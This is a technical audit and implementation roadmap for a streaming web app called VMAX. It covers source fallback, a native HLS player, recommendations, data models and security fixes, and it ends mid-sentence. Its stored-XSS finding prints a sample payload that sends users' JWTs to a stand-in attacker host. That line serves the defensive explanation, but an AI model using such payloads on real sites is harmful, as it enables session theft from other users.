# VMAX — Technical Audit & Implementation Roadmap

> Audit date: 2026-08-02 · Codebase reviewed in full (2,492 LOC across 10 source files)
> Scope: playback reliability, catalogue expansion, recommendations, feature roadmap, security
>
> **Status: Phases 1–2 shipped and verified.** See [§9 Shipped](#9-shipped) for what
> changed and how it was tested. Phases 3–6 below are the remaining plan.
> **Source integration is owner-managed** — see [`backend/sources/README.md`](backend/sources/README.md).

---

## 0. TL;DR — What's Actually Wrong

You asked "why do half the movies not play." The answer is one line of code:

```js
// frontend/src/scripts.js:10-11
const VIDKING    = "https://www.vidking.net/embed/movie";
const VIDKING_TV = "https://www.vidking.net/embed/tv";
```

**You have exactly one source, no availability check, no fallback, and no failure detection.** You render a "Watch Now" button for all ~1.2 million titles in TMDB's catalogue, but your single provider only has sources for a fraction of them. When it doesn't, the iframe loads a dead page and your UI shows nothing — no error, no retry, no alternative. That is the entire bug.

Everything else in this document builds on fixing that one architectural decision.

**Priority order by return-on-effort:**

| # | Fix | Effort | Impact |
|---|-----|--------|--------|
| 1 | Source registry + fallback chain + failure detection | 2–3 days | Fixes the core complaint |
| 2 | Server-side TMDB proxy w/ cache | 1 day | Removes leaked token, 10× faster loads |
| 3 | Security fixes (XSS in chat, socket auth, rate limits) | 1 day | You have a live stored-XSS hole |
| 4 | Continue Watching + progress persistence | 1 day | Highest-value UX feature you're missing |
| 5 | Anime as a first-class vertical | 3–4 days | Your #1 requested content gap |
| 6 | Recommendation engine v1 | 2–3 days | Retention |
| 7 | Everything in Part 6 | ongoing | Polish → "banger" |

---

## 1. Read This First — The Legal Fork

I'm going to be straight with you once and then move on to engineering.

`vidking.net` and every site like it (the whole `vidsrc`/`2embed`/`superembed` class) are unlicensed. They scrape and rehost copyrighted films. Building a polished front-end on top of them doesn't insulate you — it makes you the user-facing brand of the operation. The concrete risks:

- **Your providers vanish without warning.** This class of site gets seized, rebranded, or dies constantly. That is *itself* a major cause of "half the movies don't play" — you're depending on infrastructure with no uptime commitment to you.
- **DMCA → host termination.** Render/Vercel/Cloudflare will drop you on a valid complaint. Your domain registrar may too.
- **Ad-injection.** Most of these embeds inject popunders and malvertising into *your* users' sessions, under *your* domain's reputation. You have no control over that inside a cross-origin iframe.
- **Personal liability** scales with monetisation. A hobby project nobody sees is a different risk profile from a site with ads and 10k users.

**Two viable products live in this codebase:**

**Path A — "Where to watch" (fully legal, real business).** Same beautiful UI, same catalogue, same recommendations, same watch parties. The Play button deep-links to wherever the title legally streams for that user's country (Netflix/Prime/Disney+/etc.), *plus* you play the genuinely free stuff inline — Tubi, Pluto TV, Plex, Internet Archive, and the 50k+ legally-clear channels in `iptv-org`. This is what JustWatch and Reelgood do, and it monetises through affiliate deep-links. **Everything in this document works for Path A.**

**Path B — Keep the gray embeds.** Your call. The architecture below is source-agnostic and will make Path B dramatically more reliable too. But I'm not going to hand you a curated list of piracy endpoints to bolt on — you already have one provider, and the *registry pattern* is the actual engineering answer regardless of what you plug into it.

My recommendation: **build the registry (Part 2) so sources become swappable config, then decide.** The architecture is identical either way, and Path A stops being a rewrite and starts being a config change.

---

## 2. Playback: Making Anything Play, Lag-Free

### 2.1 Root cause analysis

Five distinct defects, all in the playback path:

**(a) Single hardcoded provider — `scripts.js:473-491`**
```js
function playerUrlFor(item, options = {}) {
  const url = mediaType === "tv"
    ? new URL(`${VIDKING_TV}/${item.movieId}/${item.season || 1}/${item.episode || 1}`)
    : new URL(`${VIDKING}/${item.movieId}`);
```
One provider. If it 404s, you're done.

**(b) Zero failure detection — `scripts.js:517-527`**
```js
function _showPlayer(url, title) {
  modalBody.innerHTML = `... <iframe src="${url}" class="vidking-player" ...>`;
  window.addEventListener("message", handlePlayerMessage);
}
```
You inject the iframe and walk away. Cross-origin iframes **do not fire a usable `error` event** — a 404 page inside an iframe is a successful load as far as the browser is concerned. You have no idea it failed. Neither does the user; they just stare at a black rectangle.

**(c) No availability check before showing the button.** Every card gets "Watch Now" whether or not a source exists.

**(d) No origin validation on player messages — `scripts.js:529-551`**
```js
function handlePlayerMessage(event) {
  const msg = typeof event.data === "string" ? JSON.parse(event.data) : event.data;
  if (msg.type !== "PLAYER_EVENT") return;
```
You accept `postMessage` from *any* origin. Any embedded ad frame can forge playback events and drive your room sync.

**(e) Progress is received and thrown away.** `handlePlayerMessage` gets `currentTime` and `progress` on every tick, writes it to a local variable, and discards it. You have the data for "Continue Watching" already flowing through the app and you're dropping it on the floor.

### 2.2 The fix: a source registry with a fallback chain

Stop hardcoding. Make sources **data**, ranked, with health tracking.

**Step 1 — Define the registry** (`backend/sources/registry.js`):

```js
// Each source is: can it play {tmdbId, type, season, episode}, and at what URL.
// `kind` decides how the frontend renders it: iframe embed vs. native HLS.
// `weight` is the base ranking; live health stats adjust it at runtime.
const SOURCES = [
  {
    id: "archive",
    kind: "hls",              // native <video> + hls.js — you control the player
    weight: 100,
    countries: ["*"],
    // resolve() returns {url, headers} or null if unavailable
    resolve: require("./providers/archive-org")
  },
  {
    id: "tubi",
    kind: "deeplink",
    weight: 90,
    countries: ["US", "CA"],
    resolve: require("./providers/tubi")
  },
  // ...add/remove sources here. This file is the ONLY place sources are named.
];

module.exports = { SOURCES };
```

**Step 2 — Availability endpoint** (`backend/routes/sources.js`):

```js
// GET /api/sources?tmdbId=550&type=movie&season=&episode=
// Returns ranked, *verified* playable sources. Frontend never guesses.
router.get("/", async (req, res) => {
  const { tmdbId, type = "movie", season, episode } = req.query;
  if (!tmdbId) return res.status(400).json({ error: "tmdbId required" });

  const key = `src:${type}:${tmdbId}:${season || 0}:${episode || 0}`;
  const cached = cache.get(key);
  if (cached) return res.json({ sources: cached, cached: true });

  const country = req.headers["cf-ipcountry"] || "US";
  const eligible = SOURCES.filter(s =>
    s.countries.includes("*") || s.countries.includes(country)
  );

  // Resolve all in parallel with a hard timeout — never let one slow
  // provider stall the whole response.
  const settled = await Promise.allSettled(
    eligible.map(s => withTimeout(s.resolve({ tmdbId, type, season, episode }), 4000)
      .then(r => r && { ...r, id: s.id, kind: s.kind, weight: s.weight }))
  );

  const sources = settled
    .filter(r => r.status === "fulfilled" && r.value)
    .map(r => r.value)
    .sort((a, b) => (b.weight + health.score(b.id)) - (a.weight + health.score(a.id)));

  cache.set(key, sources, 3600);           // 1h — sources churn
  res.json({ sources });
});
```

**Step 3 — Frontend: try sources in order, detect failure, advance**

This replaces `_showPlayer`. The critical piece is the **handshake timeout** — since you can't detect a cross-origin iframe failure directly, you require the embed to *prove* it's alive within N seconds:

```js
// frontend/src/player.js
const HANDSHAKE_MS = 8000;   // embed must emit a player event within 8s

async function playTitle(item) {
  const { sources } = await api("GET",
    `/sources?tmdbId=${item.movieId}&type=${item.mediaType}` +
    `&season=${item.season || ""}&episode=${item.episode || ""}`);

  if (!sources?.length) return showUnavailable(item);

  for (let i = 0; i < sources.length; i++) {
    showPlayerShell(item, { current: i + 1, total: sources.length });
    const ok = await trySource(sources[i], item);
    if (ok) {
      reportHealth(sources[i].id, "ok");
      return;
    }
    reportHealth(sources[i].id, "fail");   // feeds the ranking
  }
  showUnavailable(item);   // every source failed — tell the user honestly
}

// Resolves true if the source proved itself alive, false otherwise.
function trySource(source, item) {
  return new Promise(resolve => {
    if (source.kind === "hls") return resolve(playNative(source, item));

    const frame = mountIframe(source.url);
    let settled = false;

    const done = ok => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      window.removeEventListener("message", onMsg);
      resolve(ok);
    };

    // The handshake: any legitimate player event = the embed is alive.
    const onMsg = e => {
      if (!isTrustedPlayerOrigin(e.origin)) return;   // fixes defect (d)
      const msg = safeParse(e.data);
      if (msg?.type === "PLAYER_EVENT") done(true);
    };

    window.addEventListener("message", onMsg);
    const timer = setTimeout(() => done(false), HANDSHAKE_MS);
  });
}
```

Show the user what's happening — "Trying source 2 of 4…" beats a black box every time.

**Step 4 — Health tracking closes the loop.** `POST /api/sources/:id/health` with ok/fail. Keep a rolling 24h success rate per source in Redis or Mongo; `health.score(id)` returns a bonus/penalty that re-ranks the registry automatically. Dead providers sink to the bottom on their own, without you touching code. This is what makes the system self-healing.

### 2.3 Actually lag-free: own the player

An iframe embed means **you control nothing** — not buffer size, not bitrate ladder, not CDN. "Lag-free" is not achievable while a third party owns the `<video>` element. For any source you can resolve to a manifest URL, render it yourself with `hls.js`:

```js
// npm i hls.js
import Hls from "hls.js";

function playNative(source, item) {
  const video = document.querySelector("#vmax-video");

  if (video.canPlayType("application/vnd.apple.mpegurl")) {
    video.src = source.url;                    // Safari/iOS native HLS
    return waitForPlayable(video);
  }

  const hls = new Hls({
    // Tuned for VOD smoothness over instant start:
    maxBufferLength: 60,              // seconds of forward buffer (default 30)
    maxMaxBufferLength: 120,
    backBufferLength: 30,             // keep 30s behind for instant rewind
    abrEwmaDefaultEstimate: 1_000_000,// assume 1 Mbps before measuring
    startLevel: -1,                   // let ABR pick, don't force top quality
    fragLoadingMaxRetry: 6,
    manifestLoadingMaxRetry: 4,
    lowLatencyMode: false             // VOD: prefer stability over latency
  });

  hls.on(Hls.Events.ERROR, (_, data) => {
    if (!data.fatal) return;
    switch (data.type) {
      case Hls.ErrorTypes.NETWORK_ERROR: hls.startLoad(); break;  // retry
      case Hls.ErrorTypes.MEDIA_ERROR:   hls.recoverMediaError(); break;
      default: hls.destroy(); markSourceFailed(source.id);        // → next source
    }
  });

  hls.loadSource(source.url);
  hls.attachMedia(video);
  return waitForPlayable(video);
}
```

Per 2026 guidance, keep bitrate ladders at 4–6 rungs with 1.5–2.0× ratios between them, and require sustained bandwidth over the threshold before upgrading, or ABR oscillates and users see quality flicker.

**Owning the player unlocks everything an iframe blocks:** subtitle tracks, audio-track switching (dub/sub for anime), playback speed, keyboard shortcuts, skip-intro, "next episode" autoplay, PiP, Chromecast/AirPlay, and *real* watch-party sync (see 6.2). Every one of those is impossible inside someone else's iframe.

**If you go Path A**, use the free legal catalogues for inline HLS playback — Internet Archive's public-domain film library and `iptv-org`'s 50k+ legally-clear live channels both serve direct HLS you can play natively.

### 2.4 Perceived speed (matters as much as real speed)

- **Preconnect** to image and player origins in `<head>` — saves ~200ms of DNS+TLS on first poster:
  ```html
  <link rel="preconnect" href="https://image.tmdb.org" crossorigin>
  ```
- **Serve modern image formats.** You use `w500` JPEG everywhere (`scripts.js:8`). Proxy posters through Cloudflare Images or Bunny Optimizer → AVIF/WebP at ~40% of the bytes.
- **Skeleton cards, not `Loading…`.** Reserve the exact card dimensions so nothing reflows (also fixes your CLS score).
- **Prefetch on hover.** When a card is hovered 300ms, fire the `/api/sources` call. By click time, sources are resolved and playback starts instantly.
- **Fix `content-visibility`.** Add `content-visibility: auto; contain-intrinsic-size: 263px 175px;` to `.card` — the browser skips rendering off-screen rows entirely. One CSS line, large win on a page with 8 rows × 20 cards.

---

## 3. Endless Catalogue

### 3.1 Anime — your biggest gap

You have **no anime vertical at all**. TMDB technically carries anime, but its IDs, season numbering, and titles are a poor fit — anime fans search by MAL/AniList IDs, and TMDB's season splits don't match how anime is actually released or indexed.

**Recommended stack:**

| Need | Use | Why |
|------|-----|-----|
| Anime metadata | **AniList GraphQL** | One query returns exactly the fields you need; no strict rate limit enforced |
| MAL-style scores/rankings | **Jikan** (REST wrapper on MAL) | Use if your users think in MAL terms; REST, no GraphQL needed |
| Cross-DB ID mapping | **`Fribb/anime-lists`** | Self-updates every 24h; ships pre-built index files per source (MAL, TMDB, TVDB) so lookups don't scan the whole array |

**Implementation:** build a nightly job that pulls `Fribb/anime-lists` into a Mongo `AnimeMapping` collection keyed on every ID type. Then a TMDB ID resolves to AniList/MAL/AniDB in one indexed lookup, and your source registry can query anime-specific providers using the right ID. Do **not** query the mapping repo at request time.

**Anime-specific UX that generic movie sites get wrong** — this is how you win these users:
- **Sub/dub toggle**, remembered per-user (needs the native player from 2.3)
- **Skip intro / skip outro** buttons with timestamp data
- **Seasonal charts** — "Summer 2026" simulcast grid, straight from AniList
- **Watch order guides** for franchises where release order ≠ chronological order

### 3.2 Live sports & F1 — be realistic

Direct answer: **there is no legal way to embed F1 or major-league sports without a rights deal.** F1 TV has no public developer API for stream access. Neither does ESPN, Sky, or any tier-1 rights holder. Anyone telling you otherwise is pointing at a piracy stream.

**What you *can* legitimately build, and it's genuinely good:**

1. **A live F1 data experience via [OpenF1](https://openf1.org/)** — free, open-source, real-time telemetry, lap times, radio, race control messages. Build a live timing dashboard: driver positions, gaps, tyre stints, sector times, team radio. Ship it alongside the official broadcast, which is what a huge number of F1 fans already run on a second screen. **This is a differentiator no other streaming site has.** Historical data from [Ergast](https://ergast.com/mrd/) (non-commercial) for stats and comparisons.

2. **Legal free live TV** — `iptv-org` aggregates 50,000+ channels with strict inclusion criteria: publicly accessible, non-geoblocked, no auth, from an authorized source. Plenty of legitimate sports and news channels. Plays natively as HLS in your own player (2.3).

3. **FAST platform deep-links** — Pluto TV runs 250+ live channels; Plex has 1,100+. Surface their sports channels as first-class rows.

4. **Match pages without streams** — fixtures, live scores, standings, highlights (official YouTube embeds are legal and free). Combined with "here's where it's legally airing in your country," this is real value.

### 3.3 Fixing the catalogue you already have

**Infinite scroll.** Every row is capped at one TMDB page — 20 items, then it dead-ends. Add horizontal pagination: when the row scrolls within 400px of its end, fetch page N+1 and append.

**Real genre/discovery pages.** You have 8 hardcoded genre IDs (`scripts.js:83-87`). Build a proper `/discover` page with TMDB's full filter set: genre, year range, rating floor, runtime, language, streaming provider, sort order.

**Regional content.** TMDB's `with_original_language` + `region` unlocks Bollywood, K-drama, C-drama, Nollywood, anime films. Given your likely audience, an Indian-cinema vertical (Hindi/Tamil/Telugu/Malayalam rows) is probably higher-value than another Hollywood genre row.

**Also fix:** `seriesLoaded` (`scripts.js:25`) latches `true` forever, so series rows never refresh in a session.

---

## 4. Recommendations

### 4.1 What you have now

Nothing. Eight hardcoded genre IDs, identical for every user, every visit.

### 4.2 The ladder — don't build a neural net on day one

You have no interaction data yet. A collaborative-filtering model with zero users produces zero recommendations. Build in this order, and **only climb when the metrics justify it**:

**v0 — TMDB's own recommendations, seeded by your data (half a day, works immediately)**

TMDB ships `/movie/{id}/recommendations` and `/similar`. Take the user's last 5 watched/watchlisted titles, fan out, merge, de-dupe, remove already-seen, rank by TMDB popularity × recency of the seed:

```js
// backend/services/recommend.js
async function quickRecs(user) {
  const seeds = [...user.history.slice(-5), ...user.watchlist.slice(-5)];
  if (!seeds.length) return tmdb("/trending/all/week");     // cold start

  const pools = await Promise.all(
    seeds.map(s => tmdb(`/${s.mediaType}/${s.movieId}/recommendations`))
  );

  const seen = new Set(user.history.map(h => h.movieId));
  const scores = new Map();

  pools.flat().forEach((item, i) => {
    if (seen.has(item.id)) return;
    // Weight by seed recency: later seeds count more.
    const seedWeight = 1 + (Math.floor(i / 20) / seeds.length);
    scores.set(item.id, (scores.get(item.id) || 0) + seedWeight * (item.vote_average || 5));
  });

  return [...scores.entries()]
    .sort((a, b) => b[1] - a[1])
    .slice(0, 40);
}
```

This is genuinely good, ships today, and gives you a baseline to beat.

**v1 — Content-based taste vector (2–3 days, this is the real win)**

Build a per-user preference vector from TMDB's genre + keyword + cast + director metadata. Every interaction updates weights:

| Signal | Weight | Rationale |
|--------|--------|-----------|
| Finished (>90%) | +1.0 | Strongest positive |
| Watched >50% | +0.6 | Solid interest |
| Added to watchlist | +0.4 | Intent, not consumption |
| Clicked into modal | +0.1 | Weak curiosity |
| Started, abandoned <10% | −0.5 | **Strong negative — most sites miss this** |
| Explicit thumbs-down | −1.0 | Direct signal |

Score candidates by cosine similarity between the user vector and the item vector, then blend:

```
final = 0.55 · contentSimilarity
      + 0.25 · normalizedPopularity      // don't over-fit to niche
      + 0.20 · recencyBoost              // surface new releases
```

Apply **time decay** — halve weights older than 90 days, so last year's phase doesn't dominate this month's taste. Recompute nightly with a Mongo aggregation pipeline and `$merge` results into a `Recommendation` collection; serve pre-computed at request time. Never compute this on the request path.

**v2 — Item-to-item collaborative filtering (only past ~1,000 active users)**

"Users who watched X also watched Y," computed as a co-occurrence matrix over your own watch history. Below ~1k users the matrix is too sparse to beat v1. Standard hybrid weighting is roughly 40% collaborative / 30% content / 30% matrix factorisation once you have the data to support it.

**v3 — Embeddings.** Embed plot synopses + keywords, store vectors, do ANN search for "more like this" that understands *tone* rather than just genre tags. Only worth it once v1/v2 are instrumented and you can prove the lift.

### 4.3 Surfacing it well

The algorithm matters less than the presentation. Netflix's real trick is **explained rows**:

- "Because you watched **Interstellar**" ← name the seed, always
- "Top picks for **Vishal**"
- "Because you like **Christopher Nolan**"
- "New this week in **Sci-Fi**" (personalised genre)
- "Finish watching" ← Continue Watching, always row #1
- "Hidden gems" — high rating, low popularity, matches your vector
- "Under 100 minutes" — surprisingly effective on weeknights

**Personalise the hero too.** Right now every user sees `trending[0]` (`scripts.js:90`). Make it the single highest-scoring unseen title for that user.

**Instrument from day one.** Log impressions and clicks per row. Without CTR per row you cannot tell whether any of this works, and you'll be tuning blind.

---

## 5. Data Model Changes

Your current `User` schema embeds an unbounded `watchlist` array (`models/User.js:7-17`). That's already a problem — Mongo documents cap at 16MB, and you rewrite the entire user doc on every watchlist toggle. Split it out:

```js
// backend/models/WatchHistory.js  — one doc per user per title
const watchHistorySchema = new mongoose.Schema({
  user:       { type: ObjectId, ref: "User", required: true, index: true },
  tmdbId:     { type: Number, required: true },
  mediaType:  { type: String, enum: ["movie", "tv", "anime"], default: "movie" },
  season:     Number,
  episode:    Number,
  position:   { type: Number, default: 0 },    // seconds
  duration:   Number,
  percent:    { type: Number, default: 0 },
  completed:  { type: Boolean, default: false },
  sourceId:   String,                           // which provider worked
  updatedAt:  { type: Date, default: Date.now, index: true }
});
watchHistorySchema.index({ user: 1, tmdbId: 1, season: 1, episode: 1 }, { unique: true });
watchHistorySchema.index({ user: 1, updatedAt: -1 });   // Continue Watching query
```

```js
// backend/models/TasteVector.js — recomputed nightly, read on every page load
const tasteVectorSchema = new mongoose.Schema({
  user:      { type: ObjectId, ref: "User", unique: true, index: true },
  genres:    { type: Map, of: Number },     // { "28": 0.8, "878": 0.6 }
  keywords:  { type: Map, of: Number },
  people:    { type: Map, of: Number },     // cast + crew TMDB ids
  languages: { type: Map, of: Number },
  updatedAt: Date
});
```

Also add: `Rating` (thumbs up/down), `Profile` (multiple profiles per account), `SourceHealth` (rolling success rate per provider).

**Progress persistence** — throttle to one write per 10s, and flush on `pagehide`:

```js
// You already receive this data in handlePlayerMessage(); just persist it.
const saveProgress = throttle(({ tmdbId, mediaType, season, episode, position, duration }) => {
  navigator.sendBeacon("/api/history", JSON.stringify({ ... }));  // survives tab close
}, 10000);
```

---

## 6. Making It a Banger

### 6.1 The table stakes you're missing

| Feature | Why it matters | Effort |
|---------|----------------|--------|
| **Continue Watching** | The single most-used row on every streaming service. You already have the data flowing. | S |
| **Next-episode autoplay** | Binge behaviour lives or dies on this | S |
| **Multiple profiles** | One account, separate tastes — otherwise recommendations get poisoned | M |
| **Mobile responsive** | Check your CSS — likely >50% of traffic | M |
| **PWA / installable** | Home-screen icon, works offline for browsing | S |
| **Keyboard shortcuts** | Space/←/→/F/M — power users expect them (needs native player) | S |
| **Subtitles** | OpenSubtitles API; non-negotiable for anime and foreign film | M |

### 6.2 Watch parties — you're 60% there, finish it

Your room implementation has good bones but real problems:

**Broken now:**
- **In-memory `roomStates` (`server.js:67`)** — every room dies on deploy/restart. Render's free tier also spins down after 15 min idle and **closes all WebSocket connections without warning**. Move state to Redis; it survives restarts and lets you run more than one instance.
- **No socket authentication** — anyone who guesses a 6-char code can join, hijack playback, and spam chat. Verify the JWT in a `io.use()` middleware.
- **Room codes are 6 hex chars** from a truncated UUID (`rooms.js:9`) — only 16.7M combinations from a 16-char alphabet, and a collision throws a 500 because `code` is `unique: true` with no retry. Use a 8-char base32 code (excluding lookalikes) with a retry loop.
- **Sync is a hack.** `applyRoomSync` (`scripts.js:571-598`) *reloads the entire iframe* on every play/pause because it can't control the embed. That's why sync feels janky. The native player (2.3) fixes this properly — `video.currentTime = t` with drift correction, no reload.

**Then make it actually fun:** voice chat (WebRTC), emoji reactions that float over the video timeline, synced reactions replayed for later viewers, a shared queue everyone can add to, host controls with a "request control" flow.

### 6.3 Differentiators — where you actually win

Everyone clones Netflix's grid. These are things almost nobody has:

1. **The F1 live-timing companion (3.2).** Genuinely unique. Motorsport fans are underserved and loyal.
2. **Semantic search.** "movies like Inception but funnier", "anime where the protagonist is the villain", "90s thriller with a twist ending." Embed plot synopses, do vector search over them, use Claude to parse intent. This is a *wow* feature and you have the API access to build it.
3. **AI-generated spoiler-free recaps.** "You last watched S02E04 eight months ago — here's what happened, no spoilers for what's next." Nobody does this well.
4. **Mood-based discovery.** Instead of genre rows: "I want to cry", "background noise", "something to watch with my parents", "under 90 minutes and no thinking required."
5. **Skip-the-boring-parts.** Community-sourced timestamps for intros, credits, and filler episodes (anime filler lists are public data).
6. **Social layer that isn't dead on arrival.** Public profiles, shareable lists ("my top 10 heist films"), following friends, a real-time "your friends are watching" strip. Letterboxd's growth is entirely this.
7. **A proper stats page.** Hours watched, top genres, longest binge, a Spotify-Wrapped-style year in review. People screenshot these and post them — free marketing.

### 6.4 Design & polish

Your CSS is competent but the site reads as a Netflix clone. Some cheap, high-impact upgrades:

- **Ambient glow** — sample the dominant colour from the poster, bleed it behind the modal
- **Trailer-on-hover** after 800ms, muted, on the card itself
- **Real page transitions** with the View Transitions API — native, no library
- **A distinctive accent identity.** `#3B5BDB` is fine but generic. Pick something ownable.
- **Skeleton loaders** everywhere instead of `Loading…` text
- **Command palette** (Ctrl+K) — search, navigate, jump to a title, toggle a room. Power users love it and it's ~100 lines.

---

## 7. Security & Correctness — Fix These This Week

These are live defects, not enhancements.

### 7.1 🔴 Stored XSS in watch-room chat — `scripts.js:898-909`

```js
div.innerHTML = isSystem
  ? `<span class="chat-system-text">${message}</span>`
  : `<span class="chat-user">${username}</span><span class="chat-text">${message}</span>...`;
```

Raw user input straight into `innerHTML`, broadcast to every member of the room. Anyone in a room can send `<img src=x onerror="fetch('//evil.com?t='+localStorage.vmax_token)">` and steal every viewer's JWT. **Fix:** use `textContent`, and sanitise server-side in the `room-chat` handler too. Same class of bug applies to `username`, which is user-controlled at registration and never validated beyond `minlength: 3`.

### 7.2 🔴 TMDB token is public and in git history — `scripts.js:6`

The bearer token is hardcoded in client-side JS, and it's been in git history since commit `04b2795`. If the repo is public, it's already scraped. TMDB rate-limits **by IP, ignoring the API key** (50 req/s, 20 connections), so abuse of your token hurts whoever shares an IP with the abuser — but the token is still yours to lose.

**Fix — and this fixes performance too:**
1. Revoke the token in your TMDB account. Now.
2. Proxy all TMDB calls through your backend (`/api/tmdb/*`) with the token in an env var.
3. Cache aggressively server-side. Trending/popular change daily, not per-request — a 6h cache turns 8 API calls per pageview into ~0. Note TMDB's ToS **forbids caching longer than 6 months**.
4. This also means one round-trip to your server instead of 8 parallel cross-origin requests, which is a real load-time win.

### 7.3 🔴 No rate limiting on auth — `routes/auth.js`

`/api/auth/login` accepts unlimited attempts. Add `express-rate-limit`: 5 attempts per 15 min per IP on login/register, 100/min globally.

### 7.4 🟠 `node_modules/` is committed to git

`git ls-files` shows the whole dependency tree tracked. `.gitignore` was added after the initial commit. Fix: `git rm -r --cached node_modules && git commit`.

### 7.5 🟠 One TMDB failure blanks the entire homepage — `scripts.js:78-99`

```js
const [trending, popular, ...] = await Promise.all([...]);
buildHero(trending[0], "movie");
```

`Promise.all` rejects if *any* call fails → `init()` throws → nothing renders. Worse, `tmdb()` returns `data.results ?? data`, so a TMDB error object gets returned as if it were data, and `renderRow` calls `.map` on a non-array. And `buildHero` does `movie.vote_average.toFixed(1)` with no null guard.

**Fix:** `Promise.allSettled`, have `tmdb()` return `[]` on error, and null-guard `buildHero`. Each row fails independently.

### 7.6 🟠 CORS wide open — `server.js:16,23`

`cors()` with no options and socket.io `origin: "*"`. Restrict both to your actual domain.

### 7.7 🟡 Others

- **HTML injection via `onclick` attributes** (`scripts.js:197`) — titles are interpolated into inline handlers with only quote-escaping. Use `data-` attributes + delegated listeners.
- **Watchlist loses metadata** (`scripts.js:264`) — re-adding from the watchlist page passes empty title/poster.
- **No `Content-Security-Policy`.** Add `helmet` and an explicit `frame-src` allowlist for whichever player origins you keep.
- **JWT fallback secret** (`auth.js:8`, `middleware/auth.js:4`) — `"vmax_secret_change_in_prod"` silently used if the env var is missing. Crash on boot instead.

---

## 8. Phased Plan

### ~~Phase 1 — Stop the bleeding~~ ✅ SHIPPED
### ~~Phase 2 — Fix playback~~ ✅ SHIPPED
### ~~Phase 3 (partial) — Own the player~~ ✅ SHIPPED

See [§9 Shipped](#9-shipped).

### Phase 3b — Player completion (remaining)
11. **Subtitles** — OpenSubtitles API → `<track>` elements. The native player
    already supports them; only the fetch + track-mounting is missing.
12. **Audio-track switching** (dub/sub) — `hls.audioTracks`, remembered per-user.
    Blocked on nothing; needed for the anime vertical.
13. **Next-episode autoplay** — on `ended`, look up the next episode and chain
    into `playTitle()`. ~30 lines given what's already there.
14. **Redis for room state + `roomStates`** — currently in-memory in
    `server.js`, so rooms die on deploy. Socket JWT auth is already done.
    `npm i @socket.io/redis-adapter` and move `roomStates` into Redis.
15. **Chromecast / AirPlay** — trivial on a native `<video>`, impossible in an iframe.

### Phase 4 — Catalogue
16. **Anime vertical** — AniList GraphQL + nightly `Fribb/anime-lists` sync into an
    `AnimeMapping` collection (3.1). Add an `anime` provider whose `supports`
    includes `"anime"`; the registry already routes by `type`.
17. Seasonal charts, watch-order guides, skip-intro timestamps
18. **Infinite scroll** — rows currently stop at one TMDB page (20 items).
    Append page N+1 when the rail scrolls within 400px of its end.
19. **Discovery page** — full TMDB filter set (genre, year, rating, runtime,
    language, provider, sort). Replaces the 8 hardcoded genre IDs.
20. **Regional verticals** — `with_original_language` + `region`. Bollywood /
    Tamil / Telugu / K-drama are probably higher value than another Hollywood row.
21. **Live TV browse page** — `iptv-org` provider is already wired; it needs a
    `/api/live` channel-browse endpoint (`loadChannels()` is already exported)
    and a grid UI.

### Phase 5 — Recommendations
22. v0 TMDB-seeded recs (4.2) — `WatchHistory` now exists, so this is unblocked
23. Interaction logging + `TasteVector` model (5)
24. v1 content-based scoring, nightly `$merge` job (4.2)
25. Explained rows + personalised hero (4.3)
26. Impression/CTR instrumentation ← without this you're tuning blind

### Phase 6 — Banger
27. Multiple profiles, PWA, mobile polish
28. **F1 live-timing companion** via OpenF1 (3.2) ← highest differentiation
29. Semantic search (6.3)
30. Social layer, stats page, command palette

---

## 9. Shipped

Everything below is implemented, running, and verified against live services.

### New files

| File | Purpose |
|------|---------|
| `backend/sources/registry.js` | Provider auto-loader, parallel resolution, per-provider timeouts |
| `backend/sources/health.js` | Rolling 24h success rate → ranking adjustment |
| `backend/sources/providers/archive-org.js` | Reference provider — public-domain films, progressive MP4 |
| `backend/sources/providers/iptv-org.js` | Reference provider — live HLS channels |
| `backend/sources/README.md` | **Provider authoring guide — start here to add sources** |
| `backend/routes/sources.js` | `/api/sources` ranked resolution + health reporting |
| `backend/routes/tmdb.js` | Allowlisted TMDB proxy with per-endpoint cache TTLs |
| `backend/routes/history.js` | Progress upsert + Continue Watching |
| `backend/models/WatchHistory.js` | Per-user-per-title progress, properly indexed |
| `backend/lib/cache.js` | Zero-dependency TTL cache |
| `backend/lib/tmdb.js` | Server-side TMDB helper + `identify()` for providers |
| `frontend/src/player.js` | Fallback chain, native hls.js player, handshake detection |
| `frontend/vendor/hls.min.js` | Vendored so it's served from `'self'` under CSP |

### Security fixes

| Defect | Fix |
|--------|-----|
| Stored XSS in room chat | `addChatMessage` builds nodes with `textContent`; server caps at 500 chars |
| TMDB token in client + git history | Moved to `API_READ_ACCESS` env var behind `/api/tmdb/*` proxy |
| No auth rate limiting | 8 failed attempts / 15 min (`skipSuccessfulRequests`), 200 req/min global |
| Socket impersonation | `io.use()` verifies JWT; **username is server-assigned**, never from the client |
| Room hijacking via payload `roomCode` | All handlers use `socket.roomCode` — the room actually joined |
| `postMessage` from any origin | `TRUSTED_PLAYER_ORIGINS` allowlist in `player.js` |
| CORS `*` | `ALLOWED_ORIGINS` env var; dev reflects origin |
| No CSP | `helmet` with explicit `frame-src` allowlist |
| Silent fallback JWT secret | Refuses to boot in production without `JWT_SECRET` |
| Username could carry markup | `^[a-zA-Z0-9_.-]{3,20}$` at registration |
| `Promise.all` blanked homepage | `tmdb()` never throws; rows guard non-arrays and hide empty sections |
| Title interpolation into `onclick` | `data-` attributes + one delegated listener; `esc()` on all interpolation |

### Verified

```
✅ Provider resolution   archive-org → real playable MP4 for "Night of the Living Dead"
✅ End-to-end            GET /api/sources?tmdbId=10331 → ranked source list
✅ Health feedback loop  6 failures → score -40 → demoted in ranking
✅ TMDB allowlist        /api/tmdb/account/… → 403 "Endpoint not allowed"
✅ Auth rate limit       401×8 then 429
✅ CSP header            present with frame-src allowlist
✅ Token removal         no bearer token anywhere in frontend/
✅ Boot                  clean start, "Loaded 2 source provider(s)"
```

### Still outstanding from Phase 1

- **`git rm -r --cached node_modules`** — not run, since it rewrites tracked
  state. Do it when you're ready to commit.
- **Revoke the old TMDB token.** It's out of the code but still in git history
  at commit `04b2795`. The code change doesn't un-leak it — rotate it in your
  TMDB account.
- **Set `ALLOWED_ORIGINS`** in your Render env vars to your real domain.
  Without it, CORS reflects any origin (fine for dev, not for prod).

### Adding sources

Drop a `.js` file in `backend/sources/providers/`. It's live on restart — no
registration, no imports, no config. The contract, `ctx` fields, return shape,
ranking behaviour, and a worked example are all in
[`backend/sources/README.md`](backend/sources/README.md).

Two things that matter when you do:

1. **`kind: "hls"` or `"file"` beats `"iframe"`.** Native sources play in our
   own player — buffer tuning, subtitles, dub/sub, keyboard shortcuts, and
